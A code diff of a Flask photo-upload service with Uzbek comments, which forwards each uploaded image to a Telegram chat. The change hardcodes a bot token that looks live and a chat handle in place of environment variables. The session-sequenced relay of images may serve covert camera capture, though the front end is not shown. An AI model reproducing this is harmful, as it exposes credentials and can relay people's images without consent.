@@ -9,8 +9,9 @@ app = Flask(__name__, static_folder='static')
 UPLOAD_DIR = "uploads"
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 
-TELEGRAM_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN") or "7827433962:AAGkvZ4AyxHhQqfMnK6XCcJLfnbw1FOd3Nc"
-TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID") or "@ahadjonrasm"   # yoki kanal ID
+# 🔑 Token va chat_id ni o'zing to'g'rila
+TELEGRAM_BOT_TOKEN = "7827433962:AAGkvZ4AyxHhQqfMnK6XCcJLfnbw1FOd3Nc"
+TELEGRAM_CHAT_ID = "@ahadjonrasm"   # yoki kanal ID (raqam bo'lsa ham bo‘ladi)
 
 @app.route('/')
 def index():
@@ -19,7 +20,6 @@ def index():
 @app.route('/upload', methods=['POST'])
 def upload():
     try:
-        # form-data: photo (file), session_id (optional), seq (optional), total (optional)
         session_id = request.form.get('session_id') or str(int(time.time()))
         seq = request.form.get('seq') or None
 
@@ -27,7 +27,6 @@ def upload():
         if not file:
             return jsonify(success=False, error="photo not provided"), 400
 
-        # saqlash papkasi sessiyaga alohida
         session_dir = os.path.join(UPLOAD_DIR, secure_filename(session_id))
         os.makedirs(session_dir, exist_ok=True)
 
@@ -39,22 +38,18 @@ def upload():
         path = os.path.join(session_dir, filename)
         file.save(path)
 
-        # telegramga darhol yuborish
-        try:
-            send_photo_to_telegram(path, caption=f"📸 {session_id} - {filename}")
-        except Exception as e:
-            # Agar telegramga yuborishda xatolik bo'lsa, shunchaki xabar qaytaramiz (yoki log qilamiz)
-            return jsonify(success=False, error="Telegramga yuborishda xatolik", details=str(e)), 500
+        # Telegramga yuborish
+        send_photo_to_telegram(path, caption=f"📸 {session_id} - {filename}")
 
         return jsonify(success=True, saved=path)
     except Exception as e:
         return jsonify(success=False, error=str(e)), 500
 
 def send_photo_to_telegram(filepath, caption=None):
-    send_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
     with open(filepath, 'rb') as ph:
         resp = requests.post(
-            send_url,
+            url,
             data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption or ''},
             files={'photo': ph}
         )
